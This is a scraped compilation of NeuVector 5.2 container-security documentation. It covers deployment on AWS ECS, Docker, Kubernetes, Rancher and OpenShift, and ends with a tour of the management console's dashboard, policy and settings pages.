neuvector-scanner-pod=docker.io/neuvector/scanner:latest kubectl set image cronjob/neuvector-updater-pod neuvector-updater-pod=docker.io/neuvector/updater:latest   ","version":"5.2","tagName":"h3"},{"title":"Obtaining Support​","type":1,"pageTitle":"AWS Marketplace Billing","url":"/5.2/deploying/awsmarketplace#obtaining-support","content":" Once PAYG billing is enabled for a cluster or multiple clusters, customers are eligible for support through the SUSE Support Center (SCC) service.

Prepare several Amazon ECS instances which have the Docker engine and ECS agent containers built-in. Pick one node for the management console. Then define Security Group rules that allow inbound TCP port 8443 (NeuVector’s default management console port) for access by your client browser. Define a Security Group that allows TCP and UDP ports on 18300, 18301, 18400, 18401 . This is used by NeuVector enforcers to talk to the Controllers/Allinone. Apply this Security Group to all the ECS instances that will be deploying the NeuVector enforcers and controllers/allinone. Set an attribute on the nodes that you want to deploy NeuVector allinone or controller container. For example, if you want to run NeuVector in a controller HA mode, the recommendation is to pick at least 3 nodes then add the attribute to all of the 3 nodes.  This is how to add attributes to your ECS instances:  Select the instance, then pick “View/Edit Attributes” from the Actions drop down menu.    Then add a new attribute. For example “allinone-node” with value “true”.    Create the Allinone Task Definition. Create a new Task Definition for the Allinone container. You can use the ECS interface to manually create it or paste in the sample JSON file (see below for samples). Refer to section “1. Deploying NeuVector” of these docs for how to configure the Allinone.  Enter the placement constraint. For example, if you used the attribute labeling above, then enter this in the constraint.  attribute:allinone-node=~true     note If you examine the updated JSON file now you’ll see the placement constraint added to it.  Create a new service for the Allinone task. Set the “Placement Templates” to “One Task Per Host” so that only one Allinone/Controller can run on any host. You will also see the constraint will be used “memberOf(attribute:allinone-node=~true) which requires the node to have that attribute.    Now you can deploy the Allinone service. Set the “Number of tasks” to the desired Allinone/Controller number. Now the NeuVector Allinone or Controller containers will start running on the nodes selected. After the Allinone starts running you should be able to connect to the NeuVector console through HTTPS on port 8443. Create the Enforcer Task Definition. This is similar to the Allinone task. Configure manually through the ECS console or use the JSON sample below.  For the Enforcer placement constraint you will require that the Enforcer must NOT be on the same node as the allinone.  attribute:allinone-node!~true     Create a new service for the Enforcer task. Again, set the Task Placement to “One Task Per Host” so only one Enforcer is deployed on each host. Also note the additional constraint should show that it prevents deployment on an allinone node.    Deploy this service with desired number of enforcer nodes in “Number of tasks”. Very shortly all the enforcers will be up and running.

NeuVector’s services can be easily updated or upgraded without interrupting any running services. To do that in Amazon ECS:  If you have multiple controllers or Allinones deployed as a cluster, ignore this step. If there is only a single Allinone/controller in the system, find a new ECS instance and deploy a 2nd Allinone/controller container on it (follow the NeuVector allinone/controller ECS deployment steps). After deployed, in the NeuVector management console, you will see this new controller up and running (under Resources &gt; Controllers). This is required so that all stateful data is replicated between controllers. In ECS Services, reset and delete the old Allinone/controller service. Pull the updated NeuVector images manually or trigger AWS ECS to pull new versions of Allinone/controller containers from Dockerhub or your private registry. Create a new revision of the Allinone/Controller task, update the “CLUSTER_JOIN_ADDR” to the 2nd Allinone/controller’s private node IP address.

If you are using the separate Manager container instead of the Allinone (which already has the manager in it), simply shutdown and remove the old manager container. Then pull the new manager version, and deploy it, pointing the CLUSTER_JOIN_ADDR to the IP of the controller.  All NeuVector containers are now updated live.

To deploy in this environment, you must use Docker Compose or Run to deploy the NeuVector containers. You can use the remote host deployment (docker-compose -H HOST) to make this task easier.  Here are the sample docker compose configuration files. Note that using docker native does not support deploying the enforcer on the same node as the controller, requiring the use of the Allinone container if controller and enforcer functions are desired on a node.  Note: The environment variable NV_PLATFORM_INFO=platform=Docker is used to notify NeuVector that the platform is Docker/Swarm, even though there may be unused Kubernetes containers detected by NeuVector on a Docker EE deployment. Also to be able to see these in Network Activity -&gt; View -&gt; Show System, add the environment variable for the Enforcer NV_SYSTEM_GROUPS.  Deploy Allinone for High Availability​  For HA in production Docker native or EE environments, deploy the Allinone container on the first three production hosts. Each Allinone should point to the IP addresses of all Allinone hosts. For example, three Allinone containers is the minimum for HA, and the CLUSTER_JOIN_ADDR should list the three IP addresses separated by comma's. Additional HA Allinone's can be deployed in odd numbers, e.g. 5, 7. The deploy the Enforcer on the remaining hosts in the cluster, in any.  Deploy Allinone using docker-compose (privileged mode)​  The following is an example of the docker-compose file to deploy the allinone container on the first node. Because the allinone container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 8443:8443 volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Note: To expose the REST API in the Allinone, add the port map for 10443, for example - 10443:10443.  Add an enforcer container using docker-compose (privileged mode)​  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip - NV_PLATFORM_INFO=platform=Docker ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules:ro - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  Deploy the NeuVector Scanner Container​  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning. Important: Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  Sample docker run to deploy the scanner on the same host as the controller  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   To deploy the scanner on a different host than the controller, add the environment variable CLUSTER_ADVERTISED_ADDR so the controller can reach the scanner.  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=scanner_host_ip -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   To deploy multiple scanners on the same host as the controller, remove the port mapping and CLUSTER_ADVERTISED_ADDR environment variable.  docker run -itd --name s1 -e CLUSTER_JOIN_ADDR=controller_node_ip neuvector/scanner:latest   Where s1 is scanner 1 (use s2, s3 etc for each additional scanner).  To deploy a stand alone scanner (no controller/allinone), please see the section Parallel and Standalone Scanners.  To update the Scanner in order to get the latest CVE database updates from NeuVector, create a cron job to stop and restart the scanner, pulling the latest. See this section for details.  Deployment Without Using Privileged Mode​  For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode.

Placement of where these containers (on which nodes) are deployed must be considered, and appropriate labels, taints or tolerations created to control them.  The enforcer should be deployed on every host/node where application containers to be monitored and protected by NeuVector will be running.  The controller manages the cluster of enforcers, and can be deployed on the same node as an enforcer or on a separate management node. The manager should be deployed on the node where the controller is running, and will provide console access to the controller. Other required NeuVector containers such as the manager, scanner, and updater are described in more detail in the Best Practices guide referenced below.  If you haven’t done so, pull the images from the NeuVector Docker Hub.  The images are on the NeuVector Docker Hub registry.

If you run multiple controllers in an HA configuration, as long as one controller is always up, all data will be synchronized between controllers.  If you wish to save logs such as violations, threats, vulnerabilities and events please enable the SYSLOG server in Settings.  NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/ from the controller pod. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  Persistent Volume Example​  The PersistentVolume defined in the cluster is required for persistent volume support. The requirement for NeuVector is that the accessModes needs to be ReadWriteMany(RWX). Not all storage types support the RWX access mode. For example, on GKE you may need to create a RWX persistent volume using NFS storage.  Once the PersistentVolume is created, there needs to be created a PersistentVolumeClaim as below for Controller. Currently the persistent volume is used only for the NeuVector configuration backup files in the controller (Policies, Rules, user data, integrations etc).  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector spec: accessModes: - ReadWriteMany volumeMode: Filesystem resources: requests: storage: 1Gi   Here is an example for IBM Cloud:  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector labels: billingType: &quot;hourly&quot; region: us-south zone: sjc03 spec: accessModes: - ReadWriteMany resources: requests: storage: 5Gi iops: &quot;100&quot; storageClassName: ibmc-file-retain-custom   After the Persistent Volume Claim is created, modify the NeuVector sample yaml file as shown below (old section commented out):  ... spec: template: spec: volumes: - name: nv-share # hostPath: // replaced by persistentVolumeClaim # path: /var/neuvector // replaced by persistentVolumeClaim persistentVolumeClaim: claimName: neuvector-data   Also add the following environment variable in the Controller or Allinone sample yamls for persistent volume support. This will make the Controller read the backup config when starting.   - name: CTRL_PERSIST_CONFIG   ConfigMaps and Persistent Storage​  Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage.  For more information see the ConfigMaps section.

You can also shell into the controller/enforcer/scanner pods to confirm that the ca.cert, cert.key, cert.pem files are the customized ones and that the NeuVector communications are working using the new certificates.  Sample ca.cfg file referenced above:  [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc.

The chart values.yaml should be reviewed for all the settings. The below example uses RKE2, standard Ingress and installer certificates.  # add chart helm repo add neuvector https://neuvector.github.io/neuvector-helm/ # update chart helm repo update # add domain for ingress export domain=awesome.sauce # run the helm helm upgrade -i neuvector -n neuvector neuvector/core --create-namespace --set imagePullSecrets=regsecret --set k3s.enabled=true --set k3s.runtimePath=/run/k3s/containerd/containerd.sock --set manager.ingress.enabled=true --set manager.ingress.host=neuvector.$domain --set manager.svc.type=ClusterIP --set controller.pvc.enabled=true --set controller.pvc.capacity=500Mi --set controller.internal.certificate.secret=internal-cert --set cve.scanner.internal.certificate.secret=internal-cert --set enforcer.internal.certificate.secret=internal-cert  ","version":"5.2","tagName":"h3"},{"title":"Deploy Using ConfigMap","type":0,"sectionRef":"#","url":"/5.2/deploying/production/configmap","content":"","keywords":"","version":"5.2"},{"title":"Kubernetes ConfigMap​","type":1,"pageTitle":"Deploy Using ConfigMap","url":"/5.2/deploying/production/configmap#kubernetes-configmap","content":" NeuVector supports automated deployment using the Kubernetes ConfigMap feature.

First, create your K8s cluster and confirm access with kubectl get nodes.  To deploy NeuVector use the sample deployment instructions and examples from the Kubernetes section of the Production Deployment. Edit the sample yaml if you are pulling NeuVector images from a local or cloud registry such as ECR or ACR.  Some cloud providers have integrated load balancers which are easy to deploy by using Type: LoadBalancer instead of NodePort for the NeuVector webui.  NeuVector also supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Network Access​  Make sure internal and external ingress access is configured properly. For the NodePort service, the random port in the 3xxxx range must be accessible on a public IP of a worker or master node from the outside. You can access the console using the public IP address of any worker node and that port (NodePort), or the public IP of the load balancer and default port 8443. You can view the IP/port using:  kubectl get svc -n neuvector   Most K8s services automatically enable/allow all inter-pod / inter-cluster communication between nodes which also enable the NeuVector containers (enforcers, controllers, manager) to communicate within the cluster.  The sample Kubernetes yaml file will deploy one manager and 3 controllers. It will deploy an enforcer on every node as a daemonset.

The default (Helm-based) NeuVector deployment will deploy NeuVector containers into the cattle-neuvector-system namespace.  Note: Only NeuVector deployments through Apps &amp; Marketplace of Rancher version 2.6.5+ can be managed directly (single sign on to NeuVector console) through Rancher. If adding clusters to Rancher with NeuVector already deployed, or where NeuVector has been deployed directly onto the cluster, these clusters will not be enabled for SSO integration.  Deploy NeuVector​  First, find the NeuVector chart in Rancher charts, select it and review the instructions and various configuration values. (Optional) Create a project to deploy into if desired, e.g. NeuVector. Note: If you see more than one NeuVector chart, don't select the one that is for upgrading legacy NeuVector 4.x Helm chart deployments.    Deploy the NeuVector chart, first configuring appropriate values for a Rancher deployment, such as:  Container run-time, e.g. docker for RKE and containerd for RKE2, or select the K3s value if using K3s.Manager service type: change to LoadBalancer if available on public cloud deployments. If access is only desired through Rancher, any allowed value will work here. See the Important note below about changing the default admin password in NeuVector.Indicate if this cluster will be either a multi-cluster federated Primary, or remote (or select both if either option is desired).Persistent volume for configuration backups    Click 'Install' after you have reviewed and updated any chart values.  After successful NeuVector deployment, you will see a summary of the deployments, daemon sets, and cron job for NeuVector. You will also be able to see the services deployed in the Services Discovery menu on the left.    Manage NeuVector​  You will now see a NeuVector menu item in the left, and selecting that will show a NeuVector tile/button, which when clicked will take you to the NeuVector console, in a new tab.    When this Single Sign On (SSO) access method is used for the first time, a corresponding user in the NeuVector cluster is created for the Rancher user login. The same user name of the Rancher logged in user will be created in NeuVector, with a role of either admin or fedAdmin, and Identity provider as Rancher.    Note in the above screen shot, two Rancher users admin and gkosaka have been automatically created for SSO. If another user is create manually in NeuVector, the Identity provider would be listed as NeuVector, as shown below. This local user can login directly to the NeuVector console without going through Rancher.    important It is recommended to login directly to the NeuVector console as admin/admin to manually change the admin password to a strong password. This will only change the NeuVector identity provider admin user password (you may see another admin user whose identify provider is Rancher). Alternatively, include a ConfigMap as a secret in the initial deployment from Rancher (see chart values for ConfigMap settings) to set the default admin password to a strong password.  Disabling NeuVector/Rancher SSO​  To disable the ability to login to NeuVector from Rancher Manager, go to Settings -&gt; Configuration.    Rancher Legacy Deployments​  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node. See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  note Deployment on Rancher 2.x/Kubernetes should follow the Kubernetes reference section and/or Helm based deployment.  Deploy the catalog docker-compose-dist.yml, controllers will be deployed on the labelled nodes, enforcers will be deployed on the rest of nodes. (The sample file can be modified so that enforcers are only deployed to the specified nodes.) Pick one of controllers for the manager to connect to.

Add and enable log sources for NeuVector  Now we can add a new log source for NeuVector logs:    “Log Source Identifier” should be the lead controller’s pod name. NeuVector’s lead controller’s pod name can be found in the raw log data of QRadar or from NeuVector’s management console “Assets\\Controllers” as below:    Multiple log sources should be added if there are multiple NeuVector clusters running. NeuVector log source is added and enabled:    Verify the Log Activities​  Generate some NeuVector logs, for example Network Policy Violations, Configuration change events or do some Vulnerability Scans on containers/nodes. These incident or event logs will be sent to QRadar in seconds. And the NeuVector logs should be normalized in QRadar console. It can also be verified through QRadar’s DSM editor:      Integration Summary​  With the completed integration, NeuVector security and management events can be managed through QRadar together with event data from other sources. QRadar serves as the permanent event storage for NeuVector events, while the NeuVector controller performs real-time security responses and short-term cluster storage for events.

The samples below assume a standard ovs plug-in is used. This also assumes a local docker registry will be used (see instructions at end for creating the secret for dynamically pulling from neuvector or Docker Hub).  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm. The NeuVector Operator can also be used to deploy and is based on the Helm chart. To deploy the latest NeuVector container versions using an Operator, please use either the Red Hat Certified Operator from Operator Hub or the community operator, as detailed in the Operator section.  To deploy manually, first pull the appropriate NeuVector containers from the NeuVector registry into your local registry. Note: the scanner image should be pulled regularly for CVE database updates from NeuVector.  NeuVector Images on Docker Hub​  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example: neuvector/manager:5.2.0  neuvector/controller:5.2.0  neuvector/enforcer:5.2.0  neuvector/scanner:latest  neuvector/updater:latest   Please be sure to update the image references in appropriate yaml files.

For this reason, a version tag is not recommended when pulling the image. However, updating the CVE database requires regular pulling of the latest scanner image so the updater cron job can redeploy the scanner(s). The samples above assume NeuVector images are pulled, tagged and pushed to a local OpenShift registry. Deployment is then from this registry instead of directly from neuvector (or the legacy NeuVector registry on docker hub).  To regularly update the CVE database, we recommend a script/cron job be created to pull the latest NeuVector scanner image and perform the tagging and pushing steps to the local registry. This will ensure the CVE database is being updated regularly and images and containers are being scanned for new vulnerabilities.

You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Before starting the rolling updates, please pull and tag the NeuVector containers the same way as in the beginning of this page. You can pull the latest without a version number, but to trigger the rolling update you’ll need to tag the image with a version.  For example, for the controller (latest):  docker pull neuvector/controller   Then to tag/push, if latest version is 2.0.1, same as step 3 at the top of this page:  docker login -u &lt;user_name&gt; -p `oc whoami -t` docker-registry.default.svc:5000 docker tag neuvector/controller docker-registry.default.svc:5000/neuvector/controller:2.0.1 docker push docker-registry.default.svc:5000/neuvector/controller:2.0.1   You can now update your yaml file with these new versions and ‘apply’, or use the ‘oc set image ...’ command to trigger the rolling update. Please see the Kubernetes rolling update samples in this Production section to how to launch and monitor rolling updates of the NeuVector containers.  The provided sample deployment yamls already configure the rolling update policy. If you are updating via the NeuVector Helm chart, please pull the latest chart to properly configure new features such as admission control, and delete the old cluster role and cluster role binding for NeuVector.

Services. If you plan to use the multi-cluster management functions in NeuVector, one cluster must have the Federation Master service deployed, and each remote cluster must have the Federation Worker service.

The preset versions invoke a LoadBalancer for the NeuVector Console. If using the sample yaml files below replace the image names and &lt;version&gt; tags for the manager, controller and enforcer image references in the yaml file. Also make any other modifications required for your deployment environment (such as LoadBalancer/NodePort/Ingress for manager access etc). For general containerd runtime (non Rancher/K3s) kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/neuvector-containerd-k8s.yaml For 5.2.0 with Rancher on K3s containerd run-time: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/neuvector-rancher-containerd-k3s.yaml For 5.2.0 with docker run-time: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/neuvector-docker-k8s.yaml For 5.2.0 with AWS Bottlerocket run-time: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.2.0/neuvector-aws-bottlerocket-k8s.yaml Or, if modifying any of the above yaml or samples from below: kubectl create -f neuvector.yaml That's it! You should be able to connect to the NeuVector console and login with admin:admin, e.g. https://&lt;public-ip&gt;:8443  note The nodeport service specified in the neuvector.yaml file will open a random port on all kubernetes nodes for the NeuVector management web console port. Alternatively, you can use a LoadBalancer or Ingress, using a public IP and default port 8443. For nodeport, be sure to open access through firewalls for that port, if needed. If you want to see which port is open on the host nodes, please do the following commands: kubectl get svc -n neuvector And you will see something like: NAME CLUSTER-IP EXTERNAL-IP PORT(S) AGE neuvector-service-webui 10.100.195.99 &lt;nodes&gt; 8443:30257/TCP 15m If you have created your own namespace instead of using “neuvector”, replace all instances of “namespace: neuvector” and other namespace references with your namespace in the sample yaml files below.

Make sure that there is a minimum of 120 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  The provided sample deployment yamls already configure the rolling update policy. If you are updating via the NeuVector Helm chart, please pull the latest chart to properly configure new features such as admission control, and delete the old cluster role and cluster role binding for NeuVector. If you are updating via Kubernetes you can manually update to a new version with the sample commands below.  Sample Kubernetes Rolling Update​  For upgrades which just need to update to a new image version, you can use this simple approach.

PDF reports can be generated from the Dashboard which contain detailed charts and explanations.  At the top of the dashboard there is a summary of the security risks in the cluster. The wrench tool next to the overall risk score can be clicked to open a wizard which will guide you through recommended steps to reduce/improve the risk score. Mousing over each risk gauge will provide a description of it to the right and how to improve the risk score. Also see the separate documentation section Improving Security Risk Score.    Overall Security Risk Score. This is a weighted summary of the individual risk areas summarized to the right, including Service exposure, Ingress/Egress exposure, and Vulnerability exploit risks. Click on the wrench to improve the score.Service Exposure Risk Score. This is an indicator of how many services are protected by whitelist rules and running in the Monitor or Protect mode, where risk is lowest. A high ratio of services in Discover mode means these services are not segmented or isolated by whitelist rules.Ingress/Egress Risk Score. This is a weighted summary of actual threats or network violations detected on ingress or egress (out of the cluster) connections, combined with allowed ingress/egress connections. External connections which are protected by whitelist rules have lower risk but can still be attacked by embedded network attacks. Note: A list of ingress and egress IPs can be downloaded from the Ingress/Egress details section as an Exposure Report.Vulnerability Exploit Risk Score. This is the risk of exploits of vulnerabilities in running containers. Services in Discover mode with High criticality vulnerabilities will have the highest impact on the score, as they are highest risk. If services are in Monitor or Protect but still have High vulnerabilities, they are protected by network and process rules to identify (and block) suspicious activity, so will have a lower weighting on the score. A warning will be shown if the Auto-Scan button is not enabled for automatic run-time scanning.  Some of the charts are interactive, as shown below with the green arrows.    Some of the event data shown in the dashboard have limits, as described in the Reporting section.  Application Protocols Detected This chart summarizes the application protocols detected in live connections in the cluster. The category ‘Other’ means any unrecognized HTTP protocols or raw TCP connections. You can toggle between the Application Coverage and the Application Volume levels.  Application Coverage is the number of unique pod to pod conversations detected between application services. For example if service pod A connects to service pod B using HTTP that is one unique HTTP ‘conversation’, but all connections between A and B count as one conversation.Application Volume is the network activity measured in Gbytes for all services using that protocol.  Network Activity​  This provides a graphical map of your containers and the conversations between containers. It also shows connections with other local and external resources. In Monitor and Protect modes, violations are displayed with red or yellow lines to indicate that a violation has been detected.  note If a large number of containers or services are present, the view will automatically default to a namespace view (collapsed). Double click on a namespace icon to expand it.  note This display uses a local GPU if available to speed loading times. Some Windows GPUs have known issues, and the use of the GPU can be turned off in Advanced Filter window (see below for Tools).  Some of the actions possible are:  Move objects around to better view services and conversationsClick on any line (arrow) to see more detail such as protocol/port, latest time stamp, and to add or edit a rule (NOTE: both connection endpoints must be fully expanded by double clicking on each in order to see the connection details)Click on any container to see details, and the ‘i’ for real-time connections. You can also quarantine a node from here. Right click on a container to perform actions.Filter view by protocol, or search by namespace, group, container (upper right). You can add multiple filters to the selection box.Refresh the map to show latest conversationsZoom in/out to switch between a logical view (all containers collapsed into a service group) or physical view (all containers for the same service displayed)Toggle on/off the display of orchestration components such as load balancers (e.g. built in for Kubernetes or Swarm)(Service Mesh Icon) Double click to expand a pod in a service mesh such as Istio/Linkerd2 to show the sidecar and workload containers within the pod.  The Tools menu in the upper left has these functions, from left to right:  Zoom in/outReset the icon displays (if you've moved them around)Open the Advanced Filter window (filters remain for the user login session)Display/Hide the LegendTake a screen shotRefresh the Network Activity Display    Right clicking on a container displays the following actions:    You can view active sessions, start packet capture recordings, and quarantine from here. You can also change the overall protection mode for the service (all containers for that service) here. The expand/collapse options enable you to simplify or expand the objects.  The data in the map may take a few seconds after network activity to be displayed.  See the explanation of the Legend icons at the bottom of this page.  Assets​  Assets displays information about Platforms, Nodes, Containers, Registries, Sigstore Verifiers (used in Admission Control rules), and System Components (NeuVector Controllers, Scanners, and Enforcers).  NeuVector includes an end-to-end vulnerability management platform which can be integrated into your automated CI/CD process. Scan registries, images, and running containers and host nodes for vulnerabilities. Results for individual registries, nodes, and containers can be found here, while combined results and advanced reporting can be found in the Security Risks menu.  NeuVector also automatically runs the Docker Bench security report and Kubernetes CIS Benchmark (if applicable) on each host and running containers.  Note that the Status of all containers is shown in Assets -&gt; Containers, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Please see the section Scanning &amp; Compliance for additional details, including how to use the Jenkins plug-in NeuVector Vulnerability Scanner.  Policy​  This displays and manages the run-time Security Policy which determines what container networking, process, and file system application behavior is ALLOWED and DENIED. Any conversations and activities which are not explicitly allowed are logged as violations by NeuVector. This is also where Admission Control rules can be created.  Please see the Security Policy section of these docs for a detailed explanation of the behavior of the rules and how to edit or create rules.  Security Risks​  This enables customizable Vulnerability and Compliance management investigation, triage, and reporting. Easily research image vulnerabilities and find out which nodes or containers contain those vulnerabilities. Advanced filtering makes reviewing scan and compliance check results and provides customized reporting.  These menu's combine results from registry (image), node, and container vulnerability scans and compliance checks to enable end-to-end vulnerability management and reporting.  Notifications​  This is where you can see the logs for Security Events, Risk Reports (e.g. Scanning) and general Events. NeuVector also supports SYSLOG for integration with tools such as SPLUNK as well as webhook notifications.  Security Events  Use the search or Advanced Filter to locate specific events. The timeline widget at the top can also be adjusted using the left and right circles to change the time window. You can also easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.  NeuVector continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:  Implicit Deny Rule is Violated  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Violations detailed are captured and source IPs can be investigated further.  Other security events include privilege escalations, suspicious processes, or abnormal file system activity detected on containers or hosts.  Risk Reports  Registry scanning, run-time scanning, admission control events will be shown here. Also, CIS benchmarks and compliance checks results will be shown.  Please see the Reporting section for additional details and limits of the event displays in the console.  Settings​  Settings -&gt; Users &amp; Roles​  Add other users here. Users can be assigned an Admin role, a Read-only role, or custom role. In Kubernetes, users can be assigned one or more namespaces to access. Custom roles can also be configured here for users and Groups (e.g. LDAP/AD) to be mapped to the roles. See the users section for configuration details.  Settings -&gt; Configuration​  Configure a unique cluster name, new services mode, and other settings here.  If deploying on a Rancher or OpenShift cluster, authentication can be enabled such that Rancher users or OpenShift users can log into the NeuVector console with the associated RBACs. For Rancher users, a connecting button/link from the Rancher console allows Rancher admin's to open and access the NeuVector console directly.  The New Service Mode sets which protection mode any new services (applications) previously unknown or undefined in NeuVector will by default be set to. For production environments, it is not recommended to set this to Discover.  The Network Service Policy Mode, if enabled, applies the selected policy mode globally to the network rules for all groups, and each Group’s individual policy mode will only apply to process and file rules.  The Automated Promotion of Group Modes promotes a Group’s protection Mode automatically (from Discover to Monitor to Protect) based on elapsed time and criteria.  The Auto-Deletion of Unused Groups is useful for automated 'clean-up' of the discovered (and auto-created rules for) groups which are no longer in use, especially high-churn development environments. See Policy -&gt; Groups for the list of groups in NeuVector. Removing unused Groups will clean up the Groups list and all associated rules for those groups.  The XFF-FORWARDED-FOR enables/disables use of these headers in enforcing NeuVector network rules. This is useful to retain the original source IP of an ingress connection so it can be used for network rules enforcement. Enable means the source IP will be retained. See below for a detailed explanation.  Multiple webhooks can be configured to be used in Response Rules for customized notifications. Webhook format choices include Slack, JSON, and key-value pairs.  A Registry Proxy can be configured if your registry scanning connection between the controller and the registry must go through a proxy.  Configure SIEM integration through SYSLOG, including types of events, port etc. You can also choose to send events to the controller pod logs instead of or in addition to syslog. Note that these events will only be sent to the lead controller pod's log (not all controller pod logs in a multi-controller deployment).  An integration with IBM Security Advisor and QRadar can be established.  Import/Export the Security Policy file. You can configure SSO for SAML and LDAP/AD here as well. See the Enterprise Integration section for configuration details. Important! Be careful when importing the configuration file. Importing will overwrite the existing settings. If you import a ‘policy only’ file, the Groups and Rules of the Policy will be overwritten. If you import a file with ‘all’ settings, then the Policy, Users, and Configurations will be overwritten. Note that the original ‘admin’ user’s password of your current Controller will also be overwritten with the original admin’s password in the imported file.  The Usage Report and Collect Log exports may be requested by your NeuVector support team.  XFF-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Settings -&gt; LDAP/AD, SAML, and OpenID Connect​  NeuVector supports integration with LDAP/AD, SAML, and OpenID Connect for SSO and user group mapping. See the Enterprise Integration section for configuration details.  Multiple Cluster Management​  You can manage multiple NeuVector clusters (e.g. multiple Kubernetes clusters running NeuVector on different clouds or on premise) by selecting a Master cluster, and joining remote clusters to them. Each remote cluster can also be individually managed. Security rules can be propagated to multiple clusters through use of Federated Policy settings.  My Profile​  You can increase the browser 